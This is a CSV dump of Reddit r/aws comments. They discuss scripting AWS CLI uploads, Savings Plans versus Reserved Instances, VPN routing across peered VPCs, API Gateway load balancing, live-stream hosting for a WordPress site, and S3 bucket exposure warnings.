g78aadm,j2ug8d,"Yes, that's what I want, but I can't find how to turn AWS CLI commands into a batch file.",1.0
g78wjsa,j2ug8d,There is nothing special about it. Just copy the lines into a text file just like you would any of the dos command.,1.0
g79d86a,j2ug8d,"&gt; I don't know any programming 
_yet_

Fixed that for you",1.0
g77yx2s,j2ug8d,"You can use the Powershell Tools for AWS to write a script on Windows. You can store your AWS keys in environment variables and the Powershell SDK will pick them up, but a more secure solution would be to use a secure secrets manager like hashicorp vault and make sure they are rotated, least privilege access etc. 

You should make sure to restrict your IAM permissions associated with those keys to only the permissions required to complete your copy to S3.

Powershell example here https://docs.aws.amazon.com/powershell/latest/userguide/pstools-s3-upload-object.html",1.0
g77zp2e,j2ug8d,You could just write a quick python script to automate this quickly,1.0
g781mdg,j2ug8d,I would have done that already and not needed to ask about it here if I could.,-5.0
g785t7k,j2ug8d,Sounds like you’d like iam profiles- once you set it up you can pick it for any existing/new ec2 instance and it Auto inherits the iam policy you specified such that you don’t gotta worry about independent access/secret key management,1.0
g7862ax,j2ug8d,This isn't for an ec2 instance.  We need to copy files from an non-AWS on premises AD-joined Windows server to an S3 bucket.,1.0
g78dwyk,j2ug8d,"Ah. Yeah if it’s outside aws the only way I’m familiar with is to use access/secrets. You can bake those credentials in either environment vars as others have suggested or invoke them on the fly in the cli/ps/aws sdk as a parameter. 

Makes it to where you don’t gotta use the wizard at least. Hope that’s helpful.",1.0
g7872sx,j2ug8d,"Maybe I'm confused... but why do you even need to do this interactively? You can just write a quick powershell or batch script to execute aws cli commands.

Something like this in powershell

$env:AWS_ACCESS_KEY = ""your access key""
$env:AWS_SECRET_ACCESS_KEY = ""your secret key""
$env:DEFAULT_REGION = ""us-east-1""
aws s3 cp . blah",1.0
g7884fi,j2ug8d,"Because I don't know any other way to do it.  I tried Googling for it and the AWS page labeled **""How to script the backup of files to S3""** that comes up in a search actually has nothing to do with creating a script that can be run unattended since the page only shows how to hand type commands into the AWS CLI.",1.0
g788l45,j2ug8d,"Then maybe you should start with googling ""how to run scheduled tasks on windows"".

You're jumping into the deep end of the pool before you learned to walk.",2.0
g788z48,j2ug8d,"I know how to run a scheduled task already.

To run a scheduled task, I need to have a working script ready to go to point the task to.

So, I need to have a batch file that can run unattended before using a scheduled task to run that script on a schedule comes into this.",1.0
g78aixi,j2ug8d,Nobody is going to create the script for you. Use what I gave you in my original comment and adapt it to your needs. Everything you're asking is well documented all over the place.,1.0
g78bekc,j2ug8d,"It wasn't well documented enough to come up in my searches.

I never asked anyone to create a script for me.

I said what I was looking for and I thought maybe better instructions on how to do this that might be buried in the AWS documentation that someone could point to.

AWS calls their page ""How to script the backup.."" when the instructions on that page do no such thing and I didn't see any links to fill in the missing info.

Following the instructions on this page [https://aws.amazon.com/getting-started/hands-on/backup-to-s3-cli/](https://aws.amazon.com/getting-started/hands-on/backup-to-s3-cli/) is not ""scripting"" anything. Scripting implies it can run unattended as a script.",1.0
g7aqrmx,j2ug8d,Run `aws configure`,1.0
g7f4e3d,j2ug8d,"[https://www.autoitscript.com/site/autoit/](https://www.autoitscript.com/site/autoit/)

This tool may allow you to work at the level you are looking for.

AutoIt v3 is a freeware BASIC-like scripting language designed for automating the Windows GUI and general scripting.",1.0
g782alv,j2ug8d,Can you save your access key as environment variables?,1.0
g7835kw,j2ug8d,"I don't know how to do that.

So, by these questions, I take it that AWS has no built in functionality to simply save interactive AWS CLI commands as a batch file and run them non-interactively as a script without added programming complexity?",-1.0
g786zm1,j2ug8d,"You’re asking for aws to have built in cut and paste?

If you’re even willing to use the tools provided, probably don’t ask reddit for help.",4.0
g787ixe,j2ug8d,"No, I am not asking for cut and paste.  I stated that I'm looking for how to save the interactive CLI commands into a file that can be run unattended.

With other Windows command lines I have used, you can usually simply put each command into Notepad on separate lines, save as batch file and have the commands run non-interactively as a script.

Trying to find an equivalent way to do this with AWS CLI.",0.0
g78bgbw,j2ug8d,That’s exactly what you do with aws commands too.,3.0
g78bgcd,j2ug8d,"Which cli commands are you running that are interactive? You should be able to just copy paste the commands into a file as you have done in the past with other scripts. The aws cli commands are no different.
L",2.0
g78e1po,j2ug8d,[https://d1.awsstatic.com/Getting%20Started/s3/s3-from-the-cli/Getting-Started-S3-CLI-Config-Win.0f1e8531679eedf9c61334d173cce766872cdfa9.png](https://d1.awsstatic.com/Getting%20Started/s3/s3-from-the-cli/Getting-Started-S3-CLI-Config-Win.0f1e8531679eedf9c61334d173cce766872cdfa9.png),2.0
g78mpkn,j2ug8d,If you have the creds configured correctly you should be able to run that s3 command and not get prompted for creds.,1.0
g78cy1o,j2ug8d,"aws s3 cp C:\myDir s3://mybucket/ --recursive

I need to also enter the ID and secret key so that when the command runs, it has access to the S3 bucket.

When I run it through the CLI it interactively asks for info like the credentials, region etc..",1.0
g78mld5,j2ug8d,"Have a look here for different ways of configuring credentials for the cli https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html

It’s possible to provide the creds through files or environment variables so you don’t get prompted for them.",1.0
g788le8,j2ug8d,Pretty sure you can set the variables aws_access_key= and aws_secret_access_key= and run the s3 sync command in the script and it wont prompt for user input.,1.0
g77vjo4,j2tmds,"Convertible RIs end up being the same price as Compute Savings Plans, and standard RIs end up being the same price as EC2 Savings Plans.  

For me, Savings Plans have completely rendedered RIs obsolete, especially the CSP (as opposed to the EC2SP).  No instance type or region restrictions -- just spin up your instances, change them, do whatever, and it will be billed at the lower rate.  No need to ""trade in"" convertible instances, etc.

For your use case where you know you will be within a single instance family in a single region, you may as well use the EC2SP.  You just commit to $x/hr and it doesn't matter if you spin up 16 t3.small or 8 t3.medium or 1 t3.2xlarge... it will just be billed at the lower rate and you can change the instance type at will.",6.0
g78n5cc,j2tmds,Thanks. I'm going to take a look at CSPs tomorrow before I spin anything up.,1.0
g78572u,j2tmds,"For 3), you would just purchase an additional savings plan to make up the difference. While RIs binds you to instances in a region (e.g. instance families, typically), Savings Plans bind you to a minimum spend commitment, no matter the instance type, size, or region. So, as long as you're spending your committed level on compute (ec2, fargate, or lambda, you get the discount of your SP. If you find that your coverage is lower than what you want it to be because you've increased the number of instance or sizes that now cost more than your SP covered, you can purchase another SP for the delta. We are moving 100% away from RIs to savings plans. We have multiple accounts within an AWS organization and I can purchase SP's at the organization level that then apply to _all_ accounts. I don't need to be concerned with what instance sizes, families, or count that any of the users of my sub accounts choose, I only care that my SP coverage is above a certain threshold.",2.0
g78d7yp,j2tmds,"Thanks I'll look at this route. My current AWS rep is useless, this helps me a lot. I'm still trying to wrap my head around some of this, but I'll reply back if I have any other questions.",1.0
g783zs7,j2tmds,Use csp. Better rates than convertable.,1.0
g789bf2,j2tmds,Btw if you stay within the same instance family you'll never need convertible RIs. Ju just purchase more RIs for the overusage.,1.0
g7h1vh8,j2tmds,"We switched from CRIs to CSPs and oh my god my life is so much better. The savings is effectively the same, but it’s considerably less of a headache. No worrying about utilizing the instance classes you reserved or fear of missing out on a next gen instance that would benefit you. We’ve seen significantly less wasted resources and it’s just overall a huge improvement. I would absolutely recommend using CSPs, there’s almost no reason not to.

If you start spending more, just buy more CSPs. It’s super easy, you’re not limited to just one.",1.0
g7h2nzo,j2tmds,"Thanks!  I purchased a CSP yesterday. Definitely seems like a lot less headache. 

I had to talk to an AWS employee who died cost optimization because I didn't understand one major thing. You don't purchase CSPs based on your on-demand usage but based on CSP pricing on the CSP pricing page. Once I got that misconception out of my mind, I was good.",1.0
g77xpjp,j2tmds,"If you know exactly what size instances you want to work with right now, and especially if you're looking at paying some or all up front, RIs are still an excellent choice. Savings Plans are huge because they're a commitment to an hourly spend, rather than to an instance.

I'm currently juggling Savings Plans because across a fleet of arbitrary instances that can change at any time, the hourly commitment is much more useful. As with all things AWS, there's different ways of achieving the same thing, and it's all about the nuances in your specific use case.",0.0
g77y4il,j2tqt4,"Why not have the client's on-premise network be responsible for NATing?

When you give them the IPSEC code/config for their Cisco/Juniper/etc gear, also add code for NATing.  See what subnets they already have that overlap yours, and in your code create interfaces and NAT rules to handle that traffic. Check with them first what new subnets they are cool with you creating and add that to you code.",5.0
g786sny,j2tqt4,"Yes, NAT'ing at the non-AWS network is a viable solution for most use cases, however most of our clients network people are barely capable of establishing a tunnel with even the most basic config and others are unwilling to participate on principal of ""you should change not us"".  Obviously this is more a people problem than a technical one.  


I am just searching for a solution that doesn't involve spending weeks going back and forth with a 3rd party to configure their side of the network to perform NAT'ing and to handle it from the AWS side.",2.0
g781mpa,j2tqt4,This seems like the best answer in my opinion. If you're going to give them VPN access to your network then it doesn't seem like a big deal to add some additional options to regulate their NAT config.,1.0
g788fxp,j2tqt4,Run your on VPN appliance in AWS. The big players are all in the Marketplace and use that for more flexibility.,2.0
g789cxp,j2tqt4,"That's what I was afraid of, was trying to avoid running and managing more instances, but it is what it is",1.0
g789m32,j2tqt4,If you don't have control over all the on-premise networks you're better off this way.,1.0
g78b4cl,j2tqt4,"You can likely set something up with NAT Gateway (or instance) and new private subnets from a new VPC CIDR block with some route table adjustments. Mobile so cannot draw it out right now but we are in a similar situation and about to build out a POC of the above. 

That might not scale well for your use case as you can only have 5 CIDRs on a VPC. Our use case is to do the NAT in the clients VPC for connecting into our on prem environment. The network team wants the NAT before it hits on prem for (most likely) legacy reasons.",1.0
g7a6m5l,j2pc0v,"Edit: I sort of misinterpreted your question initially.

I would update to say that most (almost all?) AWS services don’t work across partitions the way they work across regions within a partition. If you want to use DMS, you’d need to be able to establish the RDS instance as a DMS source, which I am fairly certain you can’t do across partitions without exposing RDS to the Internet (which may be a nonstarter). Someone else may know better than I.

Before my edit:

Unless you’ve peered the RDS VPC with a VPC in the commercial partition, you’d need some other way to connect to RDS in the GovCloud environment.

I do not think you can peer VPCs across partitions, so barring other connection solutions I’d look at scripting this in the GovCloud environment (say on an EC2 instance) and then using IAM credentials with access to a bucket in the commercial partition to upload the data there.

Be _really_ mindful about the data flow architecture here because when mixing and matching commercial and government partitions (in any cloud), you can accidentally run afoul of security or contract requirements. Definitely have a second person from security vet the plan.",1.0
g76c5ij,j2lmq7,"You would not put a load balancer in front of API-G, no. Think of API-G as a load balancer with a lot of bells and whistles.",14.0
g7625sn,j2lmq7,Why would you need an NLB in front of the APIGW?,5.0
g762jse,j2lmq7,Manage load on the APIGW?,1.0
g76jjtt,j2lmq7,"Apigw is fully managed, it scales automatically. No need of lb here. You can set throttling limits on apigw if required.",9.0
g76caxh,j2lmq7,So you would have 2 API gateways? Doesn't really make sense to do that. You would use throttling to manage the load on an APIGW.,5.0
g76jvtx,j2lmq7,"Overkill at this point, but like others have said - definitely no need for any load balancing in front of APIGW.  Nothing you're going to make can break APIGW.  You may want to load balance different regions, but APIGW and Cloudfront have ways to do that as well....again, never put a load balancer in front of APIGW.",2.0
g76bi51,j2lmq7,"You don’t ever need a NLB in front of an api gateway. The API GW scales automatically. You can use any type of ELB in front of instances.

API GW -&gt; ELB -&gt; backend instances.
A NLB is used for super low latency / high throughput - the NLB does not inspect the HTTP packets.",3.0
g76jdqs,j2lmq7,Definitely not in front of apigw. If load balancing of microservices is required then put it in between API gateway and microservices.,3.0
g76iiq7,j2lmq7,"You don’t have to put an NLB. What is your Web traffic characteristics? 

Google AWS  API gateway quota and see if it can sustain the load.",2.0
g780eg4,j2lmq7,"The default throttling limit is 10,000 requests per second with a burst of 5,000 (shared across all APIs in an account).",1.0
g784jvn,j2oiud,"Just a quick sketch which covers all the access patterns:

    pk       | sk            
    ——————————————————————————
    „number“ | „forwarding#“&lt;number&gt; | &lt;campaign id&gt;
    „number“ | „incoming#“&lt;number&gt; | &lt;campaign id&gt; | &lt;forwarding number&gt;

Secondary index:

    campaign id | sk 
    —————————————————————————
    &lt;campaign id&gt; | „forwarding#“&lt;number&gt;
    &lt;campaign id&gt; | „incoming#“&lt;number&gt;",2.0
g77sdt7,j2oiud,There is a very good online pdf that helps others with DDB modelling. Unfortunately I am running out of battery but there was a link in this sub!,1.0
g77ngr2,j2rs2y,"You can try this approach (using ASG):

[https://docs.aws.amazon.com/autoscaling/ec2/userguide/asg-purchase-options.html](https://docs.aws.amazon.com/autoscaling/ec2/userguide/asg-purchase-options.html)

If single instance (but switch between spot and on-demand), no straight forward approach, you need to script it. If you are looking for commercial solution, INVOKE Cloud could help with this. NOTE: I am co-founder.",1.0
g78lx9h,j2rs2y,Launch Template (purchase options) + autoscaling group + user data (for automation) is the vanilla and officially supported way to go for what OP has outlined.,1.0
g780llk,j2rs2y,"One of our partners at my employer specialise in solving for this: https://spot.io/. 

Not trying to sell you anything as I don't work for them, but my coworker uses them for his small app and he saves a ton compared to RI or on-demand.",1.0
g77qgqn,j2rs2y,"Why not move to api gw and serverless so that way you pay per transaction and not per second that Infrastructure is up

Correction : I used the wrong term and said never lose a spot instance .",0.0
g77y350,j2rs2y,"This is incredibly wrong information.  You can and will lose a spot instance at any time for any reason, regardless of you bid price.",2.0
g77y7v8,j2rs2y,"Happy cake day first of all . There is a mechanism now that can prevent that. Let me find the article


https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/spot-requests.html

But there was an QuickStart / blog that went into an example . 

Maybe I am mistaken and if I am sorry",1.0
g780fq5,j2rs2y,"Can you point to where on that page it states that ""you will never lose that instance?"" That is news to me.",1.0
g785pnx,j2rs2y,"Again as stated maybe I used the wrong terminology or could be mistaken ! 

There are a lot of best practices on how to minimise the interruptions such as the below:


https://aws.amazon.com/blogs/compute/best-practices-for-handling-ec2-spot-instance-interruptions/

If you want to have only 1 instance then spot most likely not the right solution . Again I would consider serverless or if you really want to save money with EC2 maybe on demand for 6 months and then move to an RI but again for 1 server with no redundancy I am sorry but I would stick to on demand or even take a risk with spot .",1.0
g7884zy,j2rs2y,"No one is right all the time and I see that you corrected your post, so that is good. 

Just be careful when you post information online, because you never know who is reading and acting on it, which in this case could have resulted in bad things.",1.0
g77isfr,j2sbzq,"While I cannot weigh in on the appropriate EC2 sizing question, I would suggest using a CDN.  

Have you looked at AWS Media Services?  They have an entire ecosystem of functions to take your live stream and encode/package/monetize/protect/deliver it.   I’m 99% that there are no egress fees when delivering streams from an Amazon live origin through Amazon Cloudfront.  There are CDN delivery charges, but for that small of an audience, unless you’re streaming UHD or VR feeds, I don’t think they’ll be much at all.  This has the added benefit of relieving a crush of users pulling off a cloud origin.",5.0
g77j5zx,j2sbzq,"I have started reading about Media Services. But my initial impression is it was for something like sending a stream from a studio production and was overkill for my needs. I'll give it some more attention and re-read through the site.

I guess I don't understand how a CDN helps with live content like a stream vs static content that doesn't change.",1.0
g79cb5d,j2sbzq,"AWS has ready made solutions for live streaming. https://docs.aws.amazon.com/solutions/latest/live-streaming/welcome.html

Just put RTMP in and get a live stream out. Destroy after you're a done. Not much to think about and easy to use, cheap and performant. I used that for a small meetup too.",2.0
g7c4ej8,j2sbzq,I'm giving this a good look. Thank you. I wonder how much of a smaller instance I could use with this streaming infrastructure bolted on to it.,1.0
g7c5x94,j2sbzq,"Basically you don't need a instance anymore if you stream directly from the source via RTMP push (like OBS locally, Restream, StreamYard). Media Services are serverless.",2.0
g7c7rxv,j2sbzq,"But I need to put the stream into a WordPress site that is being built for the stream event.

My worry is the overhead of the live stream on the underlying WordPress server will be crushed under 2000 concurrent viewers of the stream.

I would expect the CDN portion to help that. But I don't know and need to set up the server to handle that kind of load.",1.0
g7c83tj,j2sbzq,"You do nothing on the server. You integrate a media player which can play a HLS stream and you're a done. Clients are streaming from CloudFront directly, there will be no load on the WordPress server except that teensy weensy spike when your 2000 visitors open the site at the same time, but that's not relevant. You can even put the WordPress instance behind CloudFront to improve that part.",2.0
g7c8esu,j2sbzq,"That is what I expected to happen with my last streams. But that is not what I saw in practice.

This past Sunday and Monday I had a stream each day for 60-90 minutes. It was coming from Vimeo using their embedded player on the WP site.

110 max visitors and the instance CPU was 100%. As soon as the stream ended and people left the site, the CPU returned to normal.

So either I have something horribly configured with the server (not out of the realm of possibility as I'm a noob with this) or that Vimeo player somehow caused major overhead on the site.",1.0
g7c8ndt,j2sbzq,"Don't know how Vimeo was embedded, but Media Services Live doesn't run on your server. Your live stream will never ever touch your WordPress instance. You just embed a proper media player and give it the URL of the HLS stream which you got after deploying the AWS Live Streaming Solution.

I've done this several times.",2.0
g7c8wk5,j2sbzq,"Thank you for going back and forth with me on this. I really do appreciate it.

I was given this from the stream provider which I placed in a custom HTML block on the page:

  

&lt;div style=""padding:56.25% 0 0 0;position:relative;""&gt;&lt;iframe src=""[https://vimeo.com/event/311141/embed](https://vimeo.com/event/311141/embed)"" frameborder=""0"" allow=""autoplay; fullscreen"" allowfullscreen style=""position:absolute;top:0;left:0;width:100%;height:100%;""&gt;&lt;/iframe&gt;&lt;/div&gt;",1.0
g786guu,j2sbzq,"What is your Lightsail instance doing that's pegging the CPU?  Shouldn't Vimeo/Restream/Onestream be doing all the heavy lifting, and Lightsail just serving up basic Wordpress pages?",1.0
g786m63,j2sbzq,Happy Cake Day!,1.0
g78bbfp,j2sbzq,"That is exactly what I was expecting. I really didn't understand the cpu spike.

I don't know if I have adequate logging turned on in Ubuntu or what I should be looking for if I do. The last stream was Monday afternoon so I may be out of luck looking back if logs overwrite.",1.0
g78bm2u,j2sbzq,Set up a test stream and see what happens. Won’t be enough to cause a spike but you should be able to identify any unusual requests.,2.0
g7c48n1,j2sbzq,"I tried doing a test on the same site for a hidden page. I wasn't able to duplicate using the Vimeo live stream.

I really didn't see anything obvious while monitoring services on the Linux server.

While I waited for the stream to start the highest CPU process was labeled as php-fpm. It wasn't very high CPU but given there wasn't much activity it was noticeable.

Once the stream started and I was the only viewer the higher CPU processes switched to sw-engine-fpm followed by lower usage on mysqld. Again nothing really high but those are the processes that were moving when the stream was going.

I don't know what to make of it, if anything. Does that mean anything to you by chance?",1.0
g7c9x7g,j2sbzq,"Oh, Plesk again. Fucked up software, get rid of it. sw-engine always causes troubles with high CPU utilization.

Edit: still put CloudFront in front of your WordPress and configure it that the Plesk panel is not reachable via CloudFront. Secure down your security groups, so only CloudFront is allowed to access your origin WordPress instance and you're allowed to access the Plesk panel directly.",2.0
g7caej9,j2sbzq,":O

Out of curiosity what was the giveaway that I was using Plesk?

Any suggestions on something similar but better for managing multiple WP installs on a single server? They are all very small sites. I just have this one RFP for the 2000 user livestream as my biggest audience to date.

Edit: also, I'm using Plesk by myself just to manage the different domains and WP installs on the server. I'm not reselling access to the server and having others with accounts in Plesk. So I'm not married to it other than the subscription. I just need something to manage multiple domains and WP installs.",1.0
g7cahj8,j2sbzq,It was sw-engine-fpm ^^,2.0
g7cabzv,j2sbzq,"sw-engine-fpm is... Plesk?  I don't know why that would be involved at all.

What network activity can you see in Chrome DevTools during the stream?",2.0
g7canh5,j2sbzq,"Unfortunately I'm working on historical now from this past Sunday and Monday. So at best I can see if the server logs still contain any useful data. Beyond that, I don't have any streams scheduled.

I can do test streams with a user or two but it won't be on Vimeo that the past client utilized.

So I can't exactly recreate the activity where I watched the CPU spike.",1.0
g78mk09,j2sbzq,"Definitely no EC2 for video streaming.  It's not necessary and it's not cheap.  

Others may know better, but I  think the accepted answer is:

1. Store the  video files in S3.
1. Enable  the caching service CloudFront to serve the videos without excess S3 I/O costs.

So, like, you'd link directly to the S3 object URL from your web pages using the URL that amazon provides when you upload an object.  Then cache the site and the links behind Cloudfront.

But 2000 simultaneous viewers isn't a lot by amazon standards.  You might get acceptable performance at a lower net cost by serving straight from S3?  Tutorial [here](https://docs.sumerian.amazonaws.com/tutorials/create/beginner/s3-video/) 

HTH / Good luck",1.0
g78nv7d,j2sbzq,This is a live stream and not hosted videos that visitors can play at their leisure.,1.0
g78owpm,j2sbzq,"Oh, sorry.  Then you probably want AWS Elemental:

1. Ingest live video with MediaLive
1. Store in MediaStore
1. Cache / serve via CloudFront",1.0
g7fui38,j2sbzq,"Ok. Now I'm really starting to freak out. Another of the sites I'm working on is for an art museum of a major metropolitan city in Colorado. They have a virtual event later this month.

I was just informed that they are working to secure entertainment for the event that will likely drive the site and stream viewership to between 10,000 and 15,000.

If they don't secure this big name then it would only 200-500.

I have to be prepared for up to 15,000 watching this stream. The studio broadcasting the stream will use either LiveShark or Wowza. I feel I HAVE to explore EC2 for the Wordpress instance just so I can set up something that auto scales based on the demand. But I have no clue how to do that.

Panic is beginning to set in.",1.0
g8k0b88,j2sbzq,"I feel I am making progress here with this project. The livestream will be sent from the studio to StreamShark [www.streamshark.io](https://www.streamshark.io) which send the stream through their own global CDN. So I am less worried now about the video delivery.

I still need to plan for the possibility of 15k concurrent visitors to the site. So my focus now is figuring out the setup of a horizontal, auto-scale Wordpress setup on AWS.

I plan to use Cloudfront and an elastic load balancer. I've read some tutorials for setting up the auto-scaling infrastructure.

Where I am at now is figuring out the right instance size to work with. I don't want to go too small that it kicks into scaling with only a few hundred visitors. But I also don't want to start out too big.

Is it accurate that when doing auto scale I could start the first instance as something small and have the 2nd instance that kicks in be a larger one? Or do all of the instances used need to be of the same size?

It would be great if I could spread the 15K across say 5 instances. But I don't know how healthy it would be to have 3K concurrent visitors on a single server.

I've just never dealt with these kind of numbers before.",1.0
g77pwl3,j2skyt,"Don’t use the root account.


The easy way to give a specific account access to the S3 bucket is to add the permission through iam, the bucket permissions in S3 itself are less precise I think.",2.0
g77emvg,j2n8e9,"Pritunl will be natting, not routing I'm pretty sure. Check your route table and if you don't see a route for 192.168.x.y/z then you are just heading out the default route.",3.0
g77epne,j2n8e9,"Also, you can't transit vpcs when peering.",2.0
g77fiz0,j2n8e9,"Yes i have a route on vpc A to 193.168.x.y to the peering connection between the two vpc. But I think aws dont know where to deliver the traffic .
Do you have a solution ?",0.0
g77n4sg,j2n8e9,"As per my second comment. You can't transit VPCs when peering. AFAIK  there is no direct solution, you'd have to look to solve the problem a different way",1.0
g77nc1e,j2n8e9,Like an reverse proxy on the vpn machine ?,1.0
g77wf31,j2n8e9,"I can't speculate as to your requirements, but sure a reverse may work.",1.0
g77tenm,j2n8e9,Transit GW VPN termination is the best option .,1.0
g77oq1f,j2n8e9,"193.168.0.0/16 or 192.168.0.0/16? 

The latter is usually a private network so you need to send the traffic to a vpn endpoint or a direct connect, I think.

Maybe a Transit Gateway for the traffic between the vpc’s? The peering isn’t enough to route the traffic out.

You want something like the AWS LandingZone shared-service account setup.",1.0
g77p19m,j2n8e9,"192.168 * yes :) 
Thank you for the insights , I will check that possibility",1.0
g77wog4,j2n8e9,"Transit GW will work, but maybe overkill for your problem, and likely expensive.",1.0
g77q8ob,j2n8e9,"I have alike problem with accessing from one network to another via Pritunl server (all routes was configured correctly). Culpit was iptable rule in it: 

`iptables -D FORWARD -o tun0 -m somecomments... -j DROP`

Worth to check.",2.0
g77nm5l,j2n8e9,"VPC Peering doesn't allow transitive routing. Access to your VPN will not be possible.

Eiter you have to build a site-2-site VPN from the other VPC to your VPN server (with a VGW) or you use Transit Gateway instead of VPC Peering.",1.0
g79jura,j2n8e9,"It's pretty simple You need to:

* Pick a network you don't use. lets say 198.18.0.0/29
* Set up a nat on the pritunl server with iptables as 192.168.241.2 &lt;-&gt; 198.18.0.2 coming from eth0 ( the actual ENI)
* remove the src/dest check in ec2 instance that is hosting the pritunl server. 
* Put a route in the vpc on the right like 198.18.0.0/29 via    10.182.6.10 and of course i am assuming you already have the routes for the peering

Now you should be able to connect to 198.18.0.2 from 10.174.1.200 that in the pritunl server will get natted to the ip 192.168.241.2 and routed in the vpn.

Tip: use tcpdump to look at packets in the pritunl server to figure out what's going on.",1.0
g77m9lz,j2n7sd,This is why tagging policies are important. 😀,4.0
g77kx4l,j2n7sd,"An arbitrary stack? No.

Create a new account and run the stack in there and do nothing else, that'll give you the cost of the stack 'in isolation'.",1.0
g77ti35,j2n7sd,Yes you are right but my client wants to run it in the same account.. 😅,1.0
g773mh2,j2qqot,"You're in luck because they just released cloudformation for roles/user/permission assignment.  

Not affiliated but found this helpful - https://dev.to/hayao_k/how-to-manage-aws-sso-account-assignments-in-cloudformaton-5bmm

Of course managing the Cfn for this is still going to be tedious, but at least less human error prone.  I suggest matching Group names strongly to roles/permission/accounts",1.0
g7a5ukf,j2qqot,"/u/otoz provided some great leads to this project if you’re using AWS SSO.

If you’re _not_ using AWS SSO, but want to connect your existing SSO IDP, check out Federated authentication. It’s fairly straight forward to setup for most IDPs even if you’re not used to SAML. When using your own IDP you don’t need to create user accounts in IAM.",1.0
g76w3xo,j2miph,"Yes, it has been 5 months since the general availability announcement and I have asked the same question several times.

Unfortunately, what I have been told, EB users are considered low-priority and mostly entry-level, low-budget spenders, and therefore AWS has no real interest getting the EB platform on par with ECS, EKS, etc. 

Basically, it may be anywhere 6-12 months from the announcement as AWS needs to first provide the new instances to the big accounts before they become available to the EB lowlifes.",1.0
g7s7p4m,j2miph,Thanks for the reply,1.0
g78po2v,j2ogvq,"Not sure exactly, Please verify your credentials

Also where you hosted your SQL server?RDS or EC2 or on-prem?   
Because we don't have IP for glue, so the security group ID of Glue needs to be allowed in the SQL server's security group(if it is in EC2 or RDS),  


Also launch the Glue job inside the VPC(if you already checked the connection test)",1.0
g79yh1d,j2ogvq,"Thanks for replying!

&amp;#x200B;

My SQL server is hosted on-prem

&amp;#x200B;

How could I allow the Glue security Group ID in the SQL Server's Security Group ?",1.0
g7agiih,j2ogvq,"Oh sad! That is not possible. You have to connect the database with public IP. And for glue there is not public IP.

One suggestion, try to configure VPN.",1.0
g7axx9y,j2ogvq,Do you mean VPN of glue?,1.0
g7d1nnp,j2ogvq,"No,. VPN between aws and on-prem",1.0
g7rxl3m,j2ogvq,My VPN and Security Groups are currently set to allow all connection from anywhere,1.0
g7rxytn,j2ogvq,Do you have VPN between aws and your data center then it'll work,1.0
g808jtr,j2ogvq,I don't believe I have one. Do you have some documentation on how to set that up?,1.0
g7d1ug6,j2ogvq,"Read this:
https://aws.amazon.com/premiumsupport/knowledge-center/glue-test-connection-failed/",1.0
g76isyf,j2nz75,"They sent you an API gateway URL - look in API gateway for that ID and it is probably set up with proxy access to S3, and that should show you the bucket.  The bucket may actually be protected, but if there is no Authn on that API gateway then it is essentially a public upload mechanism.",8.0
g76tvqg,j2nz75,"Oooh! I totally forgot that I've made like 5 api gateways in the past for testing a few things.

When I looked in api gateway though... none of the ids matched up.

Also, when I looked at the Account ID in the email it does not match what I have showing in aws when logged in. I wonder if I have another aws account floating around (totally possible as I created like 3 different ones when first learning IAM)

&amp;#x200B;

hmmm. what to do

&amp;#x200B;

edit: found out that it was actually another account I had. Shutting that account down as there was nothing substantial there. just a few projects i deployed when learning aws. Thanks /u/Redditron-2000-4",7.0
g76helw,j2nz75,[https://aws.amazon.com/blogs/storage/protect-amazon-s3-buckets-using-access-analyzer-for-s3/](https://aws.amazon.com/blogs/storage/protect-amazon-s3-buckets-using-access-analyzer-for-s3/),13.0
g76tjec,j2nz75,didn't know about this. thanks,2.0
g76t2ly,j2nz75,Yeah same. They do this every once in a while. Not a big deal. You just change the permissions to appease them. Nobody is finding your bucket,-28.0
g76uir2,j2nz75,[NoBoDy Is FiNdInG yOuR bUcKeT](https://buckets.grayhatwarfare.com/).,32.0
g76upfd,j2nz75,"Okay, well I just got owned.",24.0
g77pjyg,j2nz75,I was gonna say. Public means public. Someone will find it,5.0
g76fl1s,j2m973,"You seem to be confused about what API gateway is. API Gateway is a serverless solution for a REST/HTTP API with no servers involved. AWS manage all the infrastructure for you. You'd then use something like Lambda to sit behind each API Gateway route instead of a django server (I say django because OP's post history suggests that's what they're using).

API Gateway also offers a solution as a websocket management service so you don't need your own provisioned servers for that either.

So to simplify you have EC2 instances that are your traditional servers. You'd setup nginx on them and setup an AWS ALB to sit in front of the instances.

And the alternative solution which is API Gateway (which acts as your ALB... kind of) and Lambda (Which acts as your EC2 instances).",3.0
g76d16r,j2n2oo,You could use a cloudfront distribution per website and configure the origin to match the S3 folder/prefix accordingly.,14.0
g76glow,j2n2oo,Would that not cost a lot to have multiple cloudfront per site?,1.0
g76ht72,j2n2oo,"The actual distribution doesn't cost anything, similar to how S3 buckets don't cost anything per se. You pay a little extra for requests via cloudfront, but you get extra features (like ability to use a single bucket if you want).",6.0
g770bco,j2n2oo,I tried the distribution route it works for sure but I end up with all the cloudfront distribution url.,1.0
g7755ze,j2n2oo,Should be fairly easy to configure CNAME/alias. :),2.0
g77tidk,j2n2oo,https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html,1.0
g76esmf,j2n2oo,Why do you not want to go the multiple bucket route? Is it because you will have a ton of sites or something else?,2.0
g76gmwe,j2n2oo,I have like 50 sites thats 50 buckets.,2.0
g76jql1,j2n2oo,So what?  Bucket's themselves don't really cost anything.  It would be easier to manage as separate buckets,11.0
g76wn76,j2n2oo,Why go through the hassle and not use root folders and cloudfront.,3.0
g76hrjx,j2n2oo,"Ah okay that makes sense then, I would look at using cloud front for this then and do origin paths",2.0
g76y76p,j2n2oo,Are you using IaC tools or are you doing this by hand?,2.0
g76zpqq,j2n2oo,Using IaC tools. But I have figured it out. If you add a trailing slash at the end it will reference the index.html of the folder it is in. For e.g. http://&lt;bucket-name&gt;.s3-website-us-east-1.amazonaws.com/&lt;folder-name&gt;/,1.0
g77xbrd,j2n2oo,I did this using Cloudfront Edge @Lambda setup.,1.0
g762mp6,j2llwh,"That is literally the point of AWS Batch.

Step functions has a good integration with Batch.  Batch will spin up an ECS cluster behind the scenes.",1.0
g764weg,j2llwh,"Never used Batch, though I've heard it's a pain in the ass...But I'm not sure I want it to ""spin up"" an ECS cluster...rather simply scale the number of Tasks in/out based on the total amount of work for that enrichment.",0.0
g76fmkz,j2llwh,"I setup Batch with Terraform and it's been simple to work with.  There's not much to it.  I just runs jobs in ECS.

Regarding, your second statement, you'll need to read the Batch docs to figure out that answer.",1.0
g763770,j2llwh,Where is the data coming from?  What kind of data is it?,1.0
